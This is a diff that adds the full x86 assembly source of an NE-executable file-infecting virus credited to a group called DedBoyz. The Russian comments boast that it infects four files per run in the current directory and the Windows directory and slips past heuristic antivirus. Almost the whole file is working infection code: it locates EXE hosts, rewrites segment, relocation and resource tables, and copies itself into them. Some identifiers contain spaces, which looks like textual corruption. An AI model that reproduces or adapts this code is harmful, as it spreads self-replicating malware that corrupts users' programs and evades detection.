@@ -1,0 +1,693 @@
+
+▐█ █▐▀█▄▐▀█ ▀▐▀▀▌▀█▄▐▀▀▌    ▄▄▄█▀█
+ █ █▐  █▐▄█▌█▐  ▄  █▐       █▄▄▄▄    ▄     SneakNet
+ █▄█▐▄▄█▐  █▐▐  █▄▄█▐       ▀   ▀█  
+▐█ █▐▄ █▐▄██▐▐▄ █▄ █▐▄      ▀█▄▄█▀   ▀     (c) DedBoyz
+==============================================================================
+
+;Вирус не резидентный, при запуске заражает файлы в текущем каталоге
+;а также в WinDir, за сеанс заражает 4 файла. Вирус я тестил на 95-м,
+;все проги остаются работоспособными и вирь не эвристится (почему-то)
+;ведь он даже не шифруется (хотя мог сделать, но в таком случаи это не к
+;чему), но на редких файлах мой Web 4.2x проэвристил всеже, и я вделал
+;примитивную антиэвристическую подпрограмку, она делает DX=AX.
+;Думаю, что он должен и на 98 а может и выше, т.к. в принципе
+;используются ДОС функции 21го прерывания, а оно поддерживается везде,
+;как я понимаю, пока не происходит вызов инициализации, моно пользоватся
+;в полном обьеме Досом.
+;В качестве временного буфера использует стэк, и если текущим попадется
+;системный дир, то не заражает некоторые бадовские файлы, т.к. эти самые
+;инфицированные файлы не будут запускаться и любимый масдай незапуститься.
+;Процедура заражения мною позаимствована, но от куда я не в курсе, источник
+;не известен.
+
+
+        .model  small
+        .code
+        .386
+
+
+New Hdr Size    EQU     40H
+File ID         EQU     200H
+Entrypt         EQU     206H
+VirStart        EQU     208H
+NH offset       EQU     20AH
+VirSecs         EQU     20CH
+InitSec         EQU     20EH
+Relocs          EQU     210H
+Log Sec         EQU     212H
+CS Size         EQU     214H
+New Hdr         EQU     216H
+Virus Size      EQU     offset END Virus - offset Virus
+
+        org     100h
+
+;******************************************************************************
+
+Virus:
+        pushf
+        pusha
+        push    ds
+        push    es
+        call    Start
+
+        db      '(C) DedBoyZ Group, Ivanovo.',0
+Start:
+        pop     bx
+        sub     bx,7
+        mov     al,3
+NewInf:
+        dec     ax
+        mov     cx,4                    ;Количество infected Files
+NewStart:
+        pusha
+        mov     ax,ss
+        push    ax ax
+        pop     ds es
+        sub     sp,512+128
+        mov     bp,sp
+        mov     [bp+VirStart],bx
+        call    Find File
+        jnz     ChDir
+        call    INFECT File
+        add     sp,512+128
+        popa
+        loop    NewStart
+        jmp     short StackOk
+ChDir:
+        add     sp,512+128
+        popa
+StackOk:
+        cmp     al,2
+        jnz     FinishDir
+        call    SearchWinDir
+        jmp     short NewInf
+
+FinishDir:
+        pop     es
+        pop     ds
+        popa
+        popf
+
+Virus DONE:
+        jmp     Quit
+
+;******************************************************************************
+SearchWinDir:
+        pusha
+        mov     ah,0eh
+        mov     dl,02
+        int     21h
+        mov     ah,62h
+        int     21h
+        mov     ds,bx
+        mov     ax,ds:[2ch]
+        mov     ds,ax
+        xor     si,si
+ScanWinDir:
+        cmp     si,200h
+        jz      NoWin
+        lodsb
+        xor     al,'w'
+        jnz     ScanWinDir
+        cmp     [si+2],'ob'
+        jnz     ScanWinDir
+NoWin:
+        add     si,10
+        mov     dx,si
+        mov     ah,3bh
+        int     21h
+        popa
+        ret
+
+Find File:
+        mov     di,bp
+        add     di,File ID
+        push    di
+        mov     dx,2E2AH                ;*.
+        call    GetWord
+        stosw
+        mov     dx,5845H                ;EX
+        call    GetWord
+        stosw
+        mov     dx,0045H                ;E(0)
+        call    GetWord
+        stosw
+        xor     cx,cx
+        pop     dx
+        mov     ah,4Eh
+        int     21h
+Find LOOP:
+        or      al,al
+        jnz     Find Exit
+        call    File OK
+        jz      Find Exit
+        mov     ah,4FH
+        int     21H
+        jmp     SHORT Find LOOP
+Find Exit:
+        ret
+
+TestName:
+        mov     si,dx
+        lodsd
+        cmp     eax,'LNRK'              ;KRNL386.EXE
+        jz      BadFile
+        cmp     eax,'.IDG'              ;GDI.EXE
+        jz      BadFile
+        cmp     eax,'IPAT'              ;TAPIEXE.EXE
+        jz      BadFile
+        cmp     eax,'X3LM'              ;ML3XEC16.EXE
+        jz      BadFile
+        cmp     eax,'RESU'              ;USER.EXE
+        jz      BadFile
+        ret
+BadFile:
+        xor     ax,ax
+        mov     [si],ax
+        ret
+
+File OK:
+        push    ds
+        push    es
+        mov     ah,2FH
+        int     21H
+        push    es ds
+        pop     es ds
+
+        mov     dx,bx
+        add     dx,30
+        call    TestName
+        mov     ax,3D42H
+        int     21H
+
+        pop     es
+        pop     ds
+        jnc     FOK1
+        jmp     FOK Error2
+FOK1:
+        xchg    ax,bx
+        mov     ah,3FH
+        mov     dx,bp
+        mov     cx,40H
+        int     21H
+        jc      FN1
+        cmp     [bp],5A4DH
+        jnz     FN1
+        cmp     WORD PTR [bp+18H],40h
+        jc      FN1
+        mov     dx,[bp+3CH]
+        mov     [bp+NH offset],dx
+        xor     cx,cx
+        mov     ax,4200H
+        int     21H
+        jc      FN1
+        mov     ah,3FH
+        mov     cx,New Hdr Size
+        mov     dx,bp          
+        add     dx,New Hdr
+        int     21H
+        jc      FN1
+        cmp     [bp+New Hdr],454EH
+        jnz     FN1
+        mov     al,[bp+36H+New Hdr]
+        and     al,2
+        jnz     FOK2
+FN1:    jmp     FOK Error1
+
+
+FOK2:   mov     dx,[bp+16H+New Hdr]
+        call    Get SEG Entry      
+        jc      FOK Error1
+        mov     ax,[bp+2]
+        add     ax,Virus Size
+        jc      FOK Error1
+
+        mov     cx,[bp+New Hdr+32H]
+        mov     ax,1
+        shl     ax,cl
+        mov     cx,[bp]
+        mul     cx
+        add     ax,WORD PTR [bp+New Hdr+14H]
+        adc     dx,0
+        mov     cx,dx
+        xchg    ax,dx
+
+        mov     ax,4200H
+        int     21H
+        jc      FOK Error1
+        mov     ah,3FH
+        mov     cx,20H
+        mov     dx,bp
+        int     21H
+        jc      FOK Error1
+        mov     di,bp
+        mov     si,[bp+VirStart]
+        mov     cx,10H
+FOK3:   mov     ax,cs:[si]
+        add     si,2
+        add     di,2
+        cmp     ax,[di-2] 
+        loopz   FOK3
+        jz      FOK Error1
+
+
+        xor     al,al
+        ret
+
+FOK Error1:
+        mov     ah,3EH
+        int     21H
+FOK Error2:
+        mov     al,1
+        or      al,al
+        ret
+
+GetWord:                                ;DX - word > AX
+        xor     ax,ax
+        xchg    dh,cl
+        call    GetNumber
+        xchg    al,ah                   ;DH=AH
+        xchg    dl,cl
+        call    GetNumber               ;DL=AL
+        ret
+
+GetNumber:
+        in      al,40h
+        cmp     al,cl
+        jnz     GetNumber
+        ret
+
+;******************************************************************************
+INFECT File:
+        mov     dx,[bp+New Hdr+24H]
+        add     dx,[bp+NH offset]
+        xor     cx,cx
+        mov     ax,4200H
+        int     21H
+        mov     dx,bp
+        add     dx,Log Sec
+        mov     ah,3FH
+        mov     cx,2
+        int     21H
+        mov     cx,[bp+Log Sec]
+        mov     ax,1
+        shl     ax,cl
+        mov     [bp+Log Sec],ax
+
+        mov     ax,[bp+New Hdr+14H]
+        mov     [bp+Entrypt],ax
+        mov     dx,[bp+New Hdr+16H]
+        call    Get SEG Entry
+
+        mov     ax,[bp]
+        mov     [bp+InitSec],ax
+        mov     ax,[bp+2]
+        mov     [bp+New Hdr+14H],ax
+        call    SET Relocs
+
+        mov     ax,Virus Size
+        add     ax,[bp+CS Size]
+        xor     dx,dx
+        mov     cx,[bp+Log Sec]
+        div     cx
+        or      dx,dx
+        jz      INF05
+        inc     ax
+INF05:  push    ax
+        mov     ax,[bp+CS Size]
+        xor     dx,dx
+        div     cx
+        or      dx,dx
+        jz      INF07
+        inc     ax
+INF07:  pop     cx
+        sub     cx,ax
+        mov     [bp+VirSecs],cx
+
+        call    UPDATE SEG TBL
+
+        mov     ax,4200H 
+        mov     dx,[bp+NH offset]
+        xor     cx,cx
+        int     21H
+
+        lea     di,[bp+New Hdr+37H]
+        xor     ax,ax
+        stosb
+        stosd
+        mov     ah,40H
+        mov     dx,bp
+        add     dx,New Hdr
+        mov     cx,New Hdr Size
+        int     21H
+
+        call    Move END OUT
+
+        cmp     WORD PTR [bp+Relocs],0
+        jz      INF1
+        call    RELOCATE Relocs
+INF1:   call    WRITE Virus CODE
+        call    UPDATE RES TABLE
+
+        mov     ah,3EH
+        int     21H
+
+        ret
+
+UPDATE SEG TBL:
+        mov     dx,[bp+New Hdr+16H]
+        call    Get SEG Entry
+        mov     ax,[bp+2]
+        add     ax,Virus Size
+        mov     [bp+2],ax
+
+        mov     ax,[bp+6]
+        or      ax,ax
+        jz      US2
+US1:    add     ax,Virus Size
+        jnc     US2
+        xor     ax,ax
+US2:    mov     [bp+6],ax
+
+        mov     ax,4201H
+        mov     cx,0FFFFH
+        mov     dx,-8
+        int     21H
+
+        mov     ah,40H
+        mov     dx,bp
+        mov     cx,8
+        int     21H
+
+        mov     di,[bp+New Hdr+1CH]
+
+US3:    push    di
+        mov     dx,di
+        call    Get SEG Entry
+
+        mov     ax,[bp]
+        cmp     ax,[bp+InitSec]
+        jle     US4
+        add     ax,[bp+VirSecs]
+US4:    mov     [bp],ax
+
+        mov     ax,4201H
+        mov     cx,0FFFFH
+        mov     dx,-8
+        int     21H
+
+        mov     ah,40H
+        mov     dx,bp
+        mov     cx,8
+        int     21H
+        pop     di
+        dec     di
+        jnz     US3
+
+        ret
+
+Get SEG Entry:
+        mov     ax,4200H
+        dec     dx
+        mov     cl,3
+        shl     dx,cl
+        add     dx,[bp+NH offset]
+        add     dx,[bp+New Hdr+22H]
+        xor     cx,cx
+        int     21H
+        jc      GSE1
+
+        mov     ah,3FH
+        mov     dx,bp
+        mov     cx,8
+        int     21H
+GSE1:   ret
+
+Move Sector:
+        mov     ax,si
+        mov     cx,[bp+Log Sec]
+        mul     cx
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200H
+        int     21H
+
+        mov     ah,3FH
+        mov     dx,bp
+        mov     cx,[bp+Log Sec]
+        int     21H
+
+        mov     ax,[bp+VirSecs]
+        dec     ax
+        mov     cx,[bp+Log Sec]
+        mul     cx
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4201H
+        int     21H
+
+        mov     ah,40H
+        mov     dx,bp
+        mov     cx,[bp+Log Sec]
+        int     21H
+
+        ret
+
+
+Move END OUT:
+        mov     ax,[bp+CS Size]
+        mov     cx,[bp+Log Sec]
+        xor     dx,dx
+        div     cx
+        or      dx,dx
+        jz      ME01
+        inc     ax
+ME01:   add     ax,[bp+InitSec]
+        push    ax
+        xor     dx,dx
+        xor     cx,cx
+        mov     ax,4202H
+        int     21H
+        mov     cx,[bp+Log Sec]
+        div     cx
+        mov     si,ax
+        pop     di
+        dec     di
+MEO2:   push    si
+        push    di
+        call    Move Sector
+        pop     di
+        pop     si
+        dec     si
+        cmp     si,di
+        jnz     MEO2
+        ret
+
+
+SET Relocs:
+        mov     WORD PTR [bp+Relocs],0
+        mov     dx,[bp+New Hdr+16H]
+        call    Get SEG Entry
+        mov     ax,[bp+4]          
+        xor     dx,dx
+        and     ah,1               
+        mov     ax,[bp+New Hdr+14H]
+        jz      SRE
+        push    ax
+        push    ax
+        mov     ax,[bp+InitSec]
+        mov     cx,[bp+Log Sec]
+        mul     cx
+        pop     cx
+        add     ax,cx
+        adc     dx,0
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200H
+        int     21H
+        mov     ah,3FH
+        mov     dx,bp
+        mov     cx,2
+        int     21H
+        mov     ax,[bp]
+        mov     [bp+Relocs],ax
+        mov     cl,3
+        shl     ax,cl
+        add     ax,2
+        pop     cx 
+        xor     dx,dx
+        add     ax,cx
+        adc     dx,0
+SRE:    mov     [bp+CS Size],ax
+        ret
+
+RELOCATE Relocs:
+        mov     ax,[bp+Relocs]
+        mov     cl,3
+        shl     ax,cl
+        add     ax,2
+        push    ax
+
+        mov     ax,[bp+InitSec]
+        mov     cx,[bp+Log Sec]
+        mul     cx
+        add     ax,[bp+New Hdr+14H]
+        adc     dx,0
+        pop     cx
+        add     ax,cx
+        adc     dx,0
+        xchg    ax,cx
+        xchg    dx,cx
+
+RR LP:  push    cx
+        push    dx
+        push    ax
+        cmp     ax,512
+        jle     RR1
+        mov     ax,512
+RR1:    sub     dx,ax 
+        sbb     cx,0
+        push    cx
+        push    dx
+        push    ax
+        mov     ax,4200H
+        int     21H
+        pop     cx
+        mov     ah,3FH
+        mov     dx,bp
+        int     21H     
+        pop     dx
+        pop     cx
+        push    ax
+        add     dx,Virus Size
+        adc     cx,0
+        mov     ax,4200H
+        int     21H
+        pop     cx
+        mov     ah,40H
+        mov     dx,bp
+        int     21H
+        pop     ax
+        pop     dx
+        pop     cx
+        cmp     ax,512
+        jle     RRE   
+        sub     ax,512
+        sub     dx,512
+        sbb     cx,0
+        jmp     RR LP
+
+RRE:    ret
+
+WRITE Virus CODE:
+        mov     ax,[bp+InitSec]
+        mov     cx,[bp+Log Sec]
+        mul     cx
+        add     ax,[bp+New Hdr+14H]
+        adc     dx,0
+        mov     cx,dx
+        mov     dx,ax
+        push    cx
+        push    dx
+        mov     ax,4200H
+        int     21H
+        mov     si,[bp+VirStart]
+        mov     cx,Virus Size
+WVCLP:  push    cx
+        cmp     cx,512
+        jle     WVC1
+        mov     cx,512
+WVC1:   push    cx
+        mov     di,bp
+WCV2:   mov     al,cs:[si]
+        inc     si
+        stosb
+        loop    WCV2
+        pop     cx
+        mov     dx,bp
+        mov     ah,40H
+        int     21H
+        pop     cx
+        cmp     cx,512
+        jle     WVC3
+        sub     cx,512
+        jmp     WVCLP 
+
+WVC3:   pop     dx
+        pop     cx
+        mov     ax,offset Virus DONE - offset Virus
+        inc     ax
+        add     dx,ax
+        adc     cx,0
+        push    ax
+        mov     ax,4200H
+        int     21H
+        pop     ax
+        inc     ax
+        inc     ax
+        add     ax,[bp+New Hdr+14H]
+        sub     ax,[bp+Entrypt]
+        neg     ax
+        mov     [bp],ax
+        mov     ah,40H
+        mov     cx,2
+        mov     dx,bp
+        int     21H
+        ret
+
+
+UPDATE RES TABLE:
+        mov     dx,[bp+New Hdr+24H]
+        add     dx,[bp+NH offset]
+        add     dx,2
+        xor     cx,cx
+        mov     ax,4200H
+        int     21H
+URT1:
+        mov     ah,3FH    
+        mov     dx,bp
+        mov     cx,8
+        int     21H
+        cmp     WORD PTR [bp],0
+        jz      URTE           
+
+        mov     cx,[bp+2]
+
+URT2:   push    cx
+        mov     ah,3FH
+        mov     dx,bp
+        mov     cx,12
+        int     21H
+
+        mov     ax,[bp]
+        cmp     ax,[bp+InitSec]
+        jle     URT3
+        add     ax,[bp+VirSecs]
+        mov     [bp],ax
+
+        mov     ax,4201H
+        mov     dx,-12
+        mov     cx,0FFFFH
+        int     21H
+        mov     ah,40H
+        mov     dx,bp
+        mov     cx,12
+        int     21H
+
+URT3:
+        pop     cx
+        dec     cx
+        jnz     URT2
+
+        jmp     URT1
+URTE:   ret
+
+
+END Virus:
+;******************************************************************************
+
+Quit:   mov     ax,4C00h
+        int     21h
+
+        END     Virus
